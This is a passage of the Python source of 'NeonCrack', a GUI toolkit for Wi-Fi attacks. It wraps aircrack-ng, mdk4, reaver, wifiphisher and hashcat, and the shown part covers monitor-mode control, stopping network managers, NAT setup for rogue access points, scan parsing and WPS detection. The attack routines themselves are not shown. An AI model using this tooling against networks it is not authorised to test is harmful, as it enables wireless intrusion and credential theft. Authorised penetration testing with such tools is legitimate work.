#!/usr/bin/env python3
"""
────────────────────────────────────────────────────────────
           NeonCrack v7.1 ― WiFi Tactical ToolKit
		           created by Null_Lyfe
────────────────────────────────────────────────────────────

"""

# ───────────────────── imports ─────────────────────────────────────────────
import os, subprocess, threading, csv, time, signal, sys, re, collections, shutil, random
import queue
import shlex
import json
import traceback
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import importlib.util, psutil
import matplotlib; matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# ───────────── dependencies list (for Dependency-Doctor) ──────────────────
DEP_BINS = [
    "airmon-ng","airodump-ng","aireplay-ng","aircrack-ng","mdk4",
    "hcxdumptool","hcxpcapngtool","wash","hashcat","reaver","bully",
    "wifiphisher","eaphammer","wpa_sycophant","kr00k-hunter","dragondown",
    "hostapd-mana","airbase-ng","dnsmasq","nmap","hashid"
]
DEP_PKGS = ["tkinter","psutil","matplotlib","scapy","hashid","hashcat"]

# ───────────── constants / globals ────────────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT   = ("Courier New", 11)
BTN_W  = 14                               # ← **attack-button width**
CAP_DIR = "neoncrack_captures"; os.makedirs(CAP_DIR, exist_ok=True)

root = Tk(); root.title("NeonCrack v7.1"); root.configure(bg=BGC); root.geometry("1080x850")

# Tk variables
iface_var, target_var  = StringVar(), StringVar()  # target_var holds a 1-based index into `networks`
scan_time              = IntVar(value=45)
pcap_var, word_var     = StringVar(), StringVar()
hash_input             = StringVar()
mon_iface_var          = StringVar()
sticky_mon             = BooleanVar(value=False)
killer_enabled         = BooleanVar(value=False)
nmap_target            = StringVar()
nmap_profile           = StringVar(value="Quick Ping")
nmap_custom            = StringVar()
input_var              = StringVar()     # console line entry

# Utilities tab vars
vendor_lookup_var      = StringVar()     # MAC/BSSID/OUI string
cap_sanity_var         = StringVar()     # capture file path for sanity checks

# UI state
net_filter_var         = StringVar()
target_info_var        = StringVar(value="No target selected")
target_intel_var       = StringVar(value="")
status_var             = StringVar(value="")

# Process dashboard
attack_dash_var        = StringVar(value="ATTACK: idle")
scan_dash_var          = StringVar(value="SCAN: idle")

# Debug mode
# When enabled, NeonCrack will print the command that would run to the log, but will not execute it.
dry_run               = BooleanVar(value=False)

# When enabled, NeonCrack will show a command preview dialog before executing.
preview_before_run    = BooleanVar(value=False)

# Persisted config
CONFIG_PATH = os.path.join(os.path.expanduser("~"), ".config", "neoncrack", "config.json")

# runtime handles
attack_proc=None; scan_proc=None; monitor_flag=False; networks=[]
networks_meta={}  # bssid -> {power,last_seen,vendor}
oui_cache=None
aux_procs=[]  # extra long-running processes (e.g. dnsmasq) that should be cleaned on stop
bw_history=collections.deque(maxlen=60); bw_stop=threading.Event()

# Process metadata for dashboard
attack_meta={"started": None, "cmd": None, "log": None, "pid": None}
scan_meta={"started": None, "cmd": None, "log": None, "pid": None}

# UI widget refs (filled in during layout)
net_tree=None
net_filter_entry=None
status_bar=None
main_pane=None
log_nb=None

# Context menus / overlays
net_ctx_menu=None
palette_win=None
palette_entry=None
palette_list=None
palette_desc_var=StringVar(value="")

art_tree=None
art_status_var=StringVar(value="")
art_filter_var=StringVar(value="All")
art_search_var=StringVar(value="")
art_autorefresh=BooleanVar(value=True)
art_ctx_menu=None

# ───────────── thread-safe UI logging ─────────────────────────────────────
class UILogger:
    def __init__(self, tk_root, *, interval_ms=50):
        self.root = tk_root
        self.interval_ms = interval_ms
        self._queues = {}  # widget -> Queue[str]
        self._running = False

    def register(self, widget):
        if widget is None:
            return
        self._queues.setdefault(widget, queue.Queue())

    def write(self, widget, text):
        if widget is None:
            return
        q = self._queues.get(widget)
        if q is None:
            q = queue.Queue()
            self._queues[widget] = q
        q.put(text)

    def start(self):
        if self._running:
            return
        self._running = True
        self.root.after(self.interval_ms, self._drain)

    def _drain(self):
        if not self._running:
            return
        for widget, q in list(self._queues.items()):
            if widget is None:
                continue
            wrote = False
            try:
                while True:
                    ln = q.get_nowait()
                    widget.insert(END, ln)
                    wrote = True
            except queue.Empty:
                pass
            if wrote:
                widget.see(END)
        self.root.after(self.interval_ms, self._drain)


def ui_call(fn, *args, **kwargs):
    """Schedule a callable to run on the Tk main thread."""
    root.after(0, lambda: fn(*args, **kwargs))


ui_log = UILogger(root)
ui_log.start()

# ───────────── helper wrappers ────────────────────────────────────────────
class _DummyProc:
    pid = 0
    stdin = None

    def poll(self):
        return 0

    def terminate(self):
        return


def _fmt_cmd(cmd):
    try:
        return " ".join(shlex.quote(str(c)) for c in cmd)
    except Exception:
        return str(cmd)


def _ensure_config_dir():
    try:
        os.makedirs(os.path.dirname(CONFIG_PATH), exist_ok=True)
    except Exception:
        pass


def load_config():
    """Load persisted config (best-effort)."""
    try:
        with open(CONFIG_PATH, "r") as f:
            cfg = json.load(f)
    except Exception:
        return

    try:
        geom = cfg.get("geometry")
        if geom:
            root.geometry(geom)
    except Exception:
        pass

    def _set(var, key):
        if key in cfg:
            try:
                var.set(cfg[key])
            except Exception:
                pass

    _set(iface_var, "iface")
    _set(sticky_mon, "sticky_mon")
    _set(scan_time, "scan_time")
    _set(nmap_profile, "nmap_profile")
    _set(nmap_custom, "nmap_custom")
    _set(dry_run, "dry_run")
    _set(preview_before_run, "preview_before_run")
    _set(art_filter_var, "art_filter")
    _set(art_search_var, "art_search")
    _set(art_autorefresh, "art_autorefresh")


def save_config():
    """Persist config (best-effort)."""
    _ensure_config_dir()
    cfg = {
        "geometry": root.winfo_geometry(),
        "iface": iface_var.get(),
        "sticky_mon": bool(sticky_mon.get()),
        "scan_time": int(scan_time.get()),
        "nmap_profile": nmap_profile.get(),
        "nmap_custom": nmap_custom.get(),
        "dry_run": bool(dry_run.get()),
        "preview_before_run": bool(preview_before_run.get()),
        "art_filter": art_filter_var.get(),
        "art_search": art_search_var.get(),
        "art_autorefresh": bool(art_autorefresh.get()),
    }
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(cfg, f, indent=2, sort_keys=True)
    except Exception:
        pass


# Load persisted config after helper funcs exist; safe before UI construction.
load_config()


def _load_oui_db():
    """Load OUI vendor DB from common system locations (best-effort)."""
    global oui_cache
    if oui_cache is not None:
        return

    oui_cache = {}
    paths = [
        "/usr/share/ieee-data/oui.txt",
        "/usr/share/misc/oui.txt",
        "/usr/share/hwdata/oui.txt",
    ]

    p = next((x for x in paths if os.path.isfile(x)), None)
    if not p:
        return

    try:
        with open(p, "r", errors="ignore") as f:
            for line in f:
                # Formats vary; handle common ones:
                #   "FC-F8-AE   (hex)\tVendor"
                #   "FCF8AE     (base 16) Vendor"
                m = re.match(r"^([0-9A-Fa-f]{2}[-:]?[0-9A-Fa-f]{2}[-:]?[0-9A-Fa-f]{2})\s+\(.*?\)\s+(.*)$", line.strip())
                if not m:
                    continue
                oui = re.sub(r"[^0-9A-Fa-f]", "", m.group(1)).upper()
                vendor = m.group(2).strip()
                if len(oui) == 6 and vendor:
                    oui_cache[oui] = vendor
    except Exception:
        oui_cache = {}


def lookup_vendor(bssid):
    """Best-effort vendor lookup for a BSSID using an OUI file."""
    _load_oui_db()
    if not bssid:
        return "Unknown"
    oui = re.sub(r"[^0-9A-Fa-f]", "", bssid)[:6].upper()
    if not oui:
        return "Unknown"
    if not oui_cache:
        return "Unknown"
    return oui_cache.get(oui, "Unknown")


def _record_proc(kind, proc, cmd, log_file=None):
    now = time.time()
    meta = attack_meta if kind == "attack" else scan_meta
    meta["started"] = now
    meta["cmd"] = _fmt_cmd(cmd)
    meta["log"] = log_file
    try:
        meta["pid"] = proc.pid
    except Exception:
        meta["pid"] = None


def _fmt_runtime(started):
    if not started:
        return "-"
    s = int(time.time() - started)
    m, s = divmod(s, 60)
    h, m = divmod(m, 60)
    return f"{h:02}:{m:02}:{s:02}"


def _update_dashboard_loop():
    # attack
    if attack_proc and attack_proc.poll() is None:
        attack_dash_var.set(
            f"ATTACK: RUN | pid={attack_meta.get('pid') or '-'} | up={_fmt_runtime(attack_meta.get('started'))}"
        )
    else:
        attack_dash_var.set("ATTACK: idle")

    # scan
    if scan_proc and scan_proc.poll() is None:
        scan_dash_var.set(
            f"SCAN: RUN | pid={scan_meta.get('pid') or '-'} | up={_fmt_runtime(scan_meta.get('started'))}"
        )
    else:
        scan_dash_var.set("SCAN: idle")

    root.after(500, _update_dashboard_loop)


def run(cmd, outfile=None, box=None):
    if dry_run.get():
        if box is not None:
            log(box, f"[DRY-RUN] {_fmt_cmd(cmd)}")
        return _DummyProc()

    return subprocess.Popen(
        cmd,
        stdout=open(outfile, "wb") if outfile else subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
        preexec_fn=os.setsid,
    )


def run_logged(cmd, box, outfile=None, *, stdin=False):
    """Run a subprocess and stream its stdout/stderr into a UI log safely."""
    ui_log.register(box)

    if dry_run.get():
        log(box, f"[DRY-RUN] {_fmt_cmd(cmd)}")
        return _DummyProc()

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE if stdin else None,
        text=True, bufsize=1, universal_newlines=True,
        preexec_fn=os.setsid,
    )

    def pump():
        with open(outfile, "a") if outfile else open(os.devnull, "w") as fh:
            for ln in proc.stdout:
                ui_log.write(box, ln)
                try:
                    fh.write(ln)
                except Exception:
                    pass

    threading.Thread(target=pump, daemon=True).start()
    return proc


def log(box, msg):
    ui_log.write(box, msg + "\n")


def _require_bins(bins, box, *, title="Missing dependencies"):
    """Return True if all binaries exist on PATH; log errors otherwise."""
    missing = [b for b in (bins or []) if shutil.which(b) is None]
    if not missing:
        return True
    log(box, f"[!] {title}: {', '.join(missing)}")
    return False


def _require_iface(box):
    iface = (iface_var.get() or "").strip()
    if not iface:
        log(box, "[!] Select interface")
        return None
    return iface


def _require_target(box):
    try:
        idx = int(target_var.get())
        return networks[idx - 1]
    except Exception:
        log(box, "[!] Pick a target in the Networks table first")
        return None


def _copy_to_clipboard(text):
    try:
        root.clipboard_clear()
        root.clipboard_append(text)
        root.update_idletasks()
    except Exception:
        pass


def _show_command_preview(cmd, *, title="Command Preview", on_execute=None):
    """Modal preview window with Copy + Execute."""
    cmd_s = _fmt_cmd(cmd)

    win = Toplevel(root)
    win.title(title)
    win.configure(bg="#05050b")
    win.geometry("900x260")
    win.transient(root)
    win.grab_set()

    Label(win, text=title, bg="#05050b", fg=ACCENT, font=("Consolas", 11, "bold"), pady=8).pack(fill=X)

    txt = Text(win, height=6, bg="#0b0b14", fg="white", insertbackground="white", font=("Consolas", 10), wrap="word")
    txt.pack(fill=BOTH, expand=True, padx=12, pady=(0, 10))
    txt.insert("1.0", cmd_s)
    txt.config(state="disabled")

    btnrow = Frame(win, bg="#05050b")
    btnrow.pack(fill=X, padx=12, pady=(0, 12))

    Button(btnrow, text="Copy", bg="#2a2a3d", fg="white", command=lambda: _copy_to_clipboard(cmd_s)).pack(side=LEFT)
    Button(btnrow, text="Close", bg="#2a2a3d", fg="white", command=win.destroy).pack(side=RIGHT)

    if on_execute is not None:
        Button(
            btnrow,
            text="Execute",
            bg=ACCENT,
            fg="white",
            command=lambda: (win.destroy(), on_execute()),
        ).pack(side=RIGHT, padx=8)


def _launch_logged(
    box,
    cmd,
    *,
    log_file=None,
    stdin=False,
    required_bins=None,
    preview_title="Command Preview",
    kind="attack",
):
    """Run a command with optional preflight and optional preview modal."""
    if required_bins and not _require_bins(required_bins, box):
        return _DummyProc()

    def _exec():
        p = run_logged(cmd, box, log_file, stdin=stdin)
        _record_proc(kind, p, cmd, log_file)
        return p

    if preview_before_run.get() and not dry_run.get():
        def _exec_and_store():
            p = _exec()
            try:
                if kind == "attack":
                    globals()["attack_proc"] = p
                elif kind == "scan":
                    globals()["scan_proc"] = p
            except Exception:
                pass
            return p

        _show_command_preview(cmd, title=preview_title, on_execute=_exec_and_store)
        return _DummyProc()

    return _exec()


def _kill_proc_group(proc, *, timeout_s=3.0):
    """Best-effort stop for a Popen started with preexec_fn=os.setsid."""
    if not proc or proc.poll() is not None:
        return
    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGTERM)
    except Exception:
        try:
            proc.terminate()
        except Exception:
            return

    t0 = time.time()
    while time.time() - t0 < timeout_s:
        if proc.poll() is not None:
            return
        time.sleep(0.05)

    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGKILL)
    except Exception:
        pass

# ───────────── interface helpers ──────────────────────────────────────────
def iw_dev_info():
    """Return {iface: {"type": "managed"|"monitor"|...}} from `iw dev` (best-effort)."""
    try:
        lines = subprocess.check_output(["iw", "dev"], text=True).splitlines()
    except subprocess.CalledProcessError:
        return {}
    except FileNotFoundError:
        return {}

    info = {}
    cur = None
    for ln in lines:
        s = ln.strip()
        if s.startswith("Interface "):
            cur = s.split()[1]
            info[cur] = {"type": None}
        elif cur and s.startswith("type "):
            info[cur]["type"] = s.split()[1]
    return info


def iw_interfaces():
    return list(iw_dev_info().keys())


def _iface_exists(name):
    name = (name or "").strip()
    if not name:
        return False
    return name in iw_dev_info()


def _resolve_monitor_iface(iface, *, box=None):
    """Return a usable monitor iface name for `iface`, or None.

    Handles both styles:
    - airmon-ng creates a new interface (wlan0mon, mon0, ...)
    - airmon-ng flips the existing iface type to 'monitor' in-place
    """
    iface = (iface or "").strip()
    if not iface:
        return None

    info_before = iw_dev_info()

    # If user already selected a monitor iface, accept it only if it exists AND is monitor.
    if iface in info_before and (info_before[iface].get("type") == "monitor"):
        return iface

    # If the name ends with mon but doesn't exist or isn't monitor, try its base.
    if iface.endswith("mon") and iface not in info_before:
        iface = iface[:-3]
        info_before = iw_dev_info()

    if iface not in info_before:
        return None

    # Try airmon-ng start, but capture output so we can debug failures.
    try:
        r = subprocess.run(
            ["airmon-ng", "start", iface],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        out = (r.stdout or "").strip()
        if box is not None and out:
            log(box, "[*] airmon-ng output:\n" + out)

        # If airmon-ng tells us monitor mode is already enabled on this iface/phy,
        # do not treat it as a failure just because no new '*mon' interface appeared.
        if "monitor mode already enabled" in out.lower():
            return iface

        # If it warns about interfering processes, optionally run check kill when Killer is enabled.
        if "processes that could cause trouble" in out.lower():
            if box is not None:
                log(box, "[*] Tip: enable Killer (Scan tab) or run: airmon-ng check kill")
            try:
                if killer_enabled.get():
                    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
    except Exception as e:
        if box is not None:
            log(box, f"[!] airmon-ng start failed: {e}")
        return None

    time.sleep(0.35)
    info_after = iw_dev_info()

    # 1) In-place monitor
    if iface in info_after and info_after[iface].get("type") == "monitor":
        return iface

    # 2) Newly created monitor iface (name can be mon0, wlan0mon, etc.)
    created = [
        name for name in info_after.keys()
        if name not in info_before and info_after[name].get("type") == "monitor"
    ]
    if created:
        return sorted(created)[0]

    # 3) Common naming (even if type is not reported correctly yet)
    guess = iface + "mon"
    if guess in info_after:
        return guess

    # 4) Any monitor iface present (last resort)
    mons = [name for name, meta in info_after.items() if meta.get("type") == "monitor"]
    if mons:
        return sorted(mons)[0]

    # 5) Fallback attempt using iw directly
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.2)
        info_after2 = iw_dev_info()
        if iface in info_after2 and info_after2[iface].get("type") == "monitor":
            if box is not None:
                log(box, "[*] Enabled monitor mode via iw fallback")
            return iface
    except Exception:
        pass

    return None


def refresh_iface_menu():
    ifaces = iw_interfaces()
    m = iface_menu["menu"]
    m.delete(0, "end")
    for i in ifaces:
        m.add_command(label=i, command=lambda v=i: iface_var.set(v))

    # Clear or correct stale persisted iface values.
    cur = (iface_var.get() or "").strip()
    if cur and cur not in ifaces:
        iface_var.set(ifaces[0] if ifaces else "")

def set_monitor(iface, en=True, *, box=None):
    """Toggle monitor mode and keep iface_var consistent.

    This must handle both monitor-mode styles:
    - in-place: the iface name stays the same but `iw dev` reports type=monitor
    - renamed: airmon-ng creates a new iface (wlan0mon, mon0, ...)

    Returns the resulting interface name (best-effort) or None on failure.
    """
    global monitor_flag

    iface = (iface or "").strip()
    if not iface:
        return None

    if en:
        mon = _resolve_monitor_iface(iface, box=box)
        if not mon:
            if box is not None:
                log(box, f"[!] Failed to enable monitor mode for: {iface}")
            return None

        iface_var.set(mon)
        monitor_flag = True
        refresh_iface_menu()
        return mon

    # Disable monitor mode.
    info_before = iw_dev_info()

    # Figure out what to stop.
    mon = iface
    if mon not in info_before:
        # Common name guess.
        guess = iface + "mon"
        if guess in info_before:
            mon = guess
        else:
            # Last resort: stop any monitor iface.
            mons = [name for name, meta in info_before.items() if meta.get("type") == "monitor"]
            if mons:
                mon = sorted(mons)[0]

    try:
        subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        # Even if stop fails, continue to refresh state.
        pass

    time.sleep(0.35)
    info_after = iw_dev_info()

    # Prefer the base iface name if it exists and is no longer monitor.
    base_guess = mon[:-3] if mon.endswith("mon") else mon
    if base_guess in info_after and info_after[base_guess].get("type") != "monitor":
        iface_var.set(base_guess)
    else:
        # Otherwise pick any non-monitor interface.
        non_mons = [name for name, meta in info_after.items() if meta.get("type") != "monitor"]
        iface_var.set(sorted(non_mons)[0] if non_mons else (sorted(info_after.keys())[0] if info_after else ""))

    monitor_flag = False
    refresh_iface_menu()
    return (iface_var.get() or "").strip() or None

def restore_monitor():
    if not sticky_mon.get() and monitor_flag:
        set_monitor(iface_var.get(),False)

# ───────────── Killer toggle ──────────────────────────────────────────────
_SERVICE_UNITS = ["NetworkManager", "wpa_supplicant", "ModemManager"]

def toggle_killer(box=None):
    """Stop/start interfering Wi-Fi managers.

    If `box` is provided, logs go there; otherwise it logs to Scan log if available,
    falling back to Utilities log.
    """
    if box is None:
        try:
            box = scan_out  # may not exist yet during early import
        except Exception:
            box = None
        if box is None:
            try:
                box = utils_out
            except Exception:
                box = None

    if killer_enabled.get():
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl", "stop", s], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "dhclient"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if box is not None:
            log(box, "[+] Killer: Wi-Fi managers stopped")
    else:
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl", "start", s], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if box is not None:
            log(box, "[*] Killer: services restarted")

# ───────────── NAT helpers ────────────────────────────────────────────────
def enable_nat(uplink, ap_if):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink,"-j","MASQUERADE"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap_if,"-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",ap_if,"-o",uplink,"-j","ACCEPT"],stdout=subprocess.DEVNULL)

def disable_nat():
    subprocess.run(["iptables","-t","nat","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=0"],stdout=subprocess.DEVNULL)

# ───────────── bandwidth monitor ──────────────────────────────────────────
def update_bw_plot():
    if not bw_history: return
    up=[u for u,_ in bw_history]; dn=[d for _,d in bw_history]
    xs=list(range(-len(up)+1,1))
    if len(xs)==1: xs=[-1,0]; up.append(up[0]); dn.append(dn[0])
    ln_up.set_data(xs,up); ln_dn.set_data(xs,dn)
    ax.set_xlim(xs[0],xs[-1]); ax.set_ylim(0,max(max(up+dn),1)*1.2)
    canvas.draw_idle()

def poll_bw(iface):
    try: prev=psutil.net_io_counters(pernic=True)[iface]
    except KeyError:
        log(utils_out,f"[!] iface {iface} not found"); return
    bw_history.append((0,0)); update_bw_plot()
    while not bw_stop.is_set():
        time.sleep(1)
        try: now=psutil.net_io_counters(pernic=True)[iface]
        except KeyError:
            log(utils_out,"iface vanished"); break
        up=(now.bytes_sent-prev.bytes_sent)/125000
        dn=(now.bytes_recv-prev.bytes_recv)/125000
        bw_history.append((up,dn)); prev=now; update_bw_plot()

def start_bw_monitor():
    iface=mon_iface_var.get().strip()
    if iface not in psutil.net_io_counters(pernic=True):
        messagebox.showerror("iface",iface or "blank"); return
    stop_bw_monitor(); bw_history.clear(); bw_stop.clear()
    threading.Thread(target=poll_bw,args=(iface,),daemon=True).start()
    log(utils_out,f"[*] Monitoring {iface}")

def stop_bw_monitor(): bw_stop.set()

# ───────────── CSV & WPS helpers ──────────────────────────────────────────
def parse_csv(path):
    out = []
    with open(path, newline="") as f:
        for r in csv.reader(f):
            if not r:
                continue
            h = (r[0] or "").strip()
            if h == "Station MAC":
                break
            if len(r) > 13 and h and h != "BSSID":
                # Only accept BSSID-looking rows.
                if not re.match(r"^[0-9A-Fa-f:]{17}$", h):
                    continue

                # Channel must be a positive int (filters out junk rows like CH=-1).
                ch_s = (r[3] or "").strip()
                try:
                    ch_i = int(ch_s)
                except Exception:
                    continue
                if ch_i <= 0:
                    continue

                bssid = h.upper()
                essid = (r[13] or "").strip() or "<hidden>"
                enc = (r[5] or "").strip()
                power = ((r[8] or "").strip() if len(r) > 8 else "")
                last_seen = ((r[2] or "").strip() if len(r) > 2 else "")
                out.append((bssid, str(ch_i), essid, enc, power, last_seen))

    return out

def detect_wps(mon,chans):
    # Best-effort WPS flagging. If tools are missing, just skip.
    if shutil.which("wash") is None or shutil.which("timeout") is None:
        log(scan_out, "[*] WPS sniff skipped (wash/timeout missing)")
        return set()

    hits=set()
    for ch in chans:
        ch = str(ch).strip()
        if not ch:
            continue
        try:
            o=subprocess.check_output(["timeout","3","wash","-i",mon,"-c",ch,"-s"],
                                      text=True,stderr=subprocess.DEVNULL)
            hits.update(m.group(1).upper() for m in
                (re.match(r"([0-9A-Fa-f:]{17})",l) for l in o.splitlines()) if m)
        except subprocess.CalledProcessError:
            pass
        except FileNotFoundError:
            # Race / partial PATH environments
            break
    log(scan_out, f"[*] WPS sniff → {len(hits)} flagged")
    return hits


# ───────────── networks UI (Treeview) ─────────────────────────────────────
_TREE_COLS = ("idx", "bssid", "ch", "enc", "wps", "essid")
_tree_sort_state = {}


def _tree_sort_value(val, *, numeric=False):
    if numeric:
        try:
            return int(val)
        except Exception:
            return 0
    return (val or "").lower()


def _tree_sortby(tree, col, descending):
    """Sort a ttk.Treeview by a given column."""
    if tree is None:
        return

    numeric = col in ("idx", "ch")

    # Preserve selection.
    sel = set(tree.selection())

    data = []
    for iid in tree.get_children(""):
        vals = tree.item(iid, "values")
        # Find column index.
        try:
            col_index = tree["columns"].index(col)
        except Exception:
            col_index = 0
        v = vals[col_index] if vals and len(vals) > col_index else ""
        data.append((_tree_sort_value(v, numeric=numeric), iid))

    data.sort(reverse=descending, key=lambda t: t[0])

    for idx, (_, iid) in enumerate(data):
        tree.move(iid, "", idx)

    # Restore selection.
    for iid in sel:
        try:
            tree.selection_add(iid)
        except Exception:
            pass

    _tree_sort_state[col] = not descending


# ───────────── artifacts browser ──────────────────────────────────────────
_ART_COLS = ("name", "size", "mtime")
_art_sort_state = {}


def _parse_size_str(s):
    """Parse strings like '129B', '1.2KB', '12.3MB' back into bytes (best-effort)."""
    if not s:
        return 0
    s = str(s).strip().upper()
    m = re.match(r"^([0-9]+(?:\.[0-9]+)?)\s*(B|KB|MB|GB|TB|PB)?$", s)
    if not m:
        return 0
    num = float(m.group(1))
    unit = m.group(2) or "B"
    mult = {
        "B": 1,
        "KB": 1024,
        "MB": 1024**2,
        "GB": 1024**3,
        "TB": 1024**4,
        "PB": 1024**5,
    }.get(unit, 1)
    return int(num * mult)


def _art_sort_key(col, vals):
    # vals = (name, size_str, mtime_str)
    if col == "name":
        return (vals[0] or "").lower()
    if col == "size":
        return _parse_size_str(vals[1])
    if col == "mtime":
        try:
            return datetime.strptime(vals[2], "%Y-%m-%d %H:%M:%S")
        except Exception:
            return datetime.fromtimestamp(0)
    return (vals[0] or "").lower()


def _art_sortby(col, descending):
    global art_tree
    if art_tree is None:
        return

    sel = set(art_tree.selection())

    rows = []
    for iid in art_tree.get_children(""):
        vals = art_tree.item(iid, "values")
        rows.append((_art_sort_key(col, vals), iid))

    rows.sort(key=lambda t: t[0], reverse=descending)
    for idx, (_, iid) in enumerate(rows):
        art_tree.move(iid, "", idx)

    for iid in sel:
        try:
            art_tree.selection_add(iid)
        except Exception:
            pass

    _art_sort_state[col] = not descending


def _fmt_size(n):
    try:
        n = int(n)
    except Exception:
        return "-"
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.0f}{unit}" if unit == "B" else f"{n:.1f}{unit}"
        n /= 1024.0
    return f"{n:.1f}PB"


def _safe_stat(path):
    try:
        return os.stat(path)
    except Exception:
        return None


def _xdg_open(path):
    opener = shutil.which("xdg-open")
    if not opener:
        messagebox.showerror("Open", "xdg-open not found")
        return
    try:
        subprocess.Popen([opener, path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        messagebox.showerror("Open", str(e))


def refresh_artifacts():
    if art_tree is None:
        return

    # Preserve selection
    sel = set(art_tree.selection())

    # Clear
    for iid in art_tree.get_children(""):
        art_tree.delete(iid)

    try:
        names = sorted(os.listdir(CAP_DIR))
    except Exception:
        names = []

    filt = (art_filter_var.get() or "All").strip()
    q = (art_search_var.get() or "").strip().lower()

    def _keep(name):
        if filt == "All":
            ok = True
        elif filt == "Captures":
            ok = name.lower().endswith((".cap", ".pcap", ".pcapng"))
        elif filt == "Logs":
            ok = name.lower().endswith((".log", ".log.csv"))
        elif filt == "CSVs":
            ok = name.lower().endswith(".csv")
        elif filt == "Converted":
            ok = name.lower().endswith((".hccapx", ".22000"))
        else:
            ok = True
        if q and q not in name.lower():
            return False
        return ok

    total = 0
    shown = 0
    for name in names:
        if not _keep(name):
            continue
        p = os.path.join(CAP_DIR, name)
        st = _safe_stat(p)
        if not st:
            continue
        if not os.path.isfile(p):
            continue
        total += st.st_size
        shown += 1
        mtime = datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
        art_tree.insert("", "end", iid=name, values=(name, _fmt_size(st.st_size), mtime))

    # Restore selection if possible
    for iid in sel:
        try:
            if art_tree.exists(iid):
                art_tree.selection_add(iid)
        except Exception:
            pass

    art_status_var.set(f"{shown} files | {_fmt_size(total)}")


def _ensure_art_ctx_menu():
    global art_ctx_menu
    if art_ctx_menu is not None:
        return
    art_ctx_menu = Menu(root, tearoff=0, bg="#0b0b14", fg="white", activebackground=ACCENT, activeforeground="white")
    art_ctx_menu.add_command(label="Open", command=open_artifact)
    art_ctx_menu.add_command(label="Copy Path", command=lambda: _copy_to_clipboard(_art_selected_path() or ""))
    art_ctx_menu.add_separator()
    art_ctx_menu.add_command(label="Delete", command=delete_artifact)
    art_ctx_menu.add_separator()
    art_ctx_menu.add_command(label="Open Folder", command=open_artifacts_folder)


def _on_artifact_right_click(evt):
    if art_tree is None:
        return
    _ensure_art_ctx_menu()
    iid = art_tree.identify_row(evt.y)
    if iid:
        art_tree.selection_set(iid)
    try:
        art_ctx_menu.tk_popup(evt.x_root, evt.y_root)
    finally:
        try:
            art_ctx_menu.grab_release()
        except Exception:
            pass


def _artifacts_autorefresh_loop():
    if art_autorefresh.get():
        try:
            cur = nb.select()
            if cur == str(tabs.get("art")):
                refresh_artifacts()
        except Exception:
            pass
    root.after(2500, _artifacts_autorefresh_loop)


def _art_selected_path():
    if art_tree is None:
        return None
    sel = art_tree.selection()
    if not sel:
        return None
    name = sel[0]
    return os.path.join(CAP_DIR, name)


def open_artifact():
    p = _art_selected_path()
    if not p:
        return
    _xdg_open(p)


def open_artifacts_folder():
    _xdg_open(os.path.abspath(CAP_DIR))


def delete_artifact():
    p = _art_selected_path()
    if not p:
        return
    if not messagebox.askyesno("Delete", f"Delete {os.path.basename(p)}?"):
        return
    try:
        os.remove(p)
    except Exception as e:
        messagebox.showerror("Delete", str(e))
        return
    refresh_artifacts()


def _tree_clear(tree):
    for iid in tree.get_children(""):
        tree.delete(iid)


def refresh_network_tree(*_):
    """Re-render the Scan tab network table from the global `networks` list."""
    global net_tree
    if net_tree is None:
        return

    filt = (net_filter_var.get() or "").strip().lower()

    _tree_clear(net_tree)

    for i, (bssid, ch, essid, enc, flag) in enumerate(networks, 1):
        if filt and (filt not in (essid or "").lower()) and (filt not in bssid.lower()):
            continue
        tag = "wps" if flag == "Y" else "normal"
        net_tree.insert("", "end", iid=str(i), values=(i, bssid, ch, enc, flag, essid), tags=(tag,))


def _on_network_select(_evt=None):
    if net_tree is None:
        return
    sel = net_tree.selection()
    if not sel:
        return
    # `iid` is the 1-based index into `networks`.
    target_var.set(str(sel[0]))


def _on_network_activate(_evt=None):
    _on_network_select()
    try:
        nb.select(tabs["attack"])
    except Exception:
        pass


def _clipboard_set(text):
    try:
        root.clipboard_clear()
        root.clipboard_append(text)
        root.update_idletasks()
    except Exception:
        pass


def _selected_network():
